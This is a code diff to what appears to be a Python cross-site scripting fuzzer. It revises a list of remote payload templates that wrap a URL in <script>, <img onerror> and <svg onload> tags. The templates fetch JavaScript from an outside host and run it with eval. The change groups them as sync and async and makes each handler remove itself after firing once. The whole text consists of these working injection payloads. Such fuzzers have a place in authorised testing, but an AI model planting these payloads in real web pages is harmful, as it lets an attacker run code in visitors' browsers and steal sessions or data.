@@ -70,11 +70,14 @@ LOCAL_PAYLOADS = [
 ]
 
 REMOTE_PAYLOADS = [
+    # Sync payloads
     ('<script src="', '"></script>'),
-    ('<img src="x" onerror="fetch(\'', '\').then(resp=>resp.text()).then(resp=>eval(resp))" />'),
-    ('<img src="x" onerror="r=new XMLHttpRequest();r.open(\'GET\',\'', '\',false);r.send(null);eval(r.responseText);" />'),
-    ('<svg/onload="fetch(\'', '\').then(resp=>resp.text()).then(resp=>eval(resp))">'),
-    ('<svg/onload="r=new XMLHttpRequest();r.open(\'GET\',\'', '\',false);r.send(null);eval(r.responseText);">'),
+    ('<img src="x" onerror="this.removeAttribute(\'onerror\');r=new XMLHttpRequest();r.open(\'GET\',\'', '\',false);r.send(null);eval(r.responseText);" />'),
+    ('<svg/onload="this.removeAttribute(\'onload\');r=new XMLHttpRequest();r.open(\'GET\',\'', '\',false);r.send(null);eval(r.responseText);">'),
+
+    # Async payloads
+    ('<img src="x" onerror="this.removeAttribute(\'onerror\');fetch(\'', '\').then(resp=>resp.text()).then(resp=>eval(resp))" />'),
+    ('<svg/onload="this.removeAttribute(\'onload\');fetch(\'', '\').then(resp=>resp.text()).then(resp=>eval(resp))">'),
 ]
 
 def xss_fuzz_labeled(args):
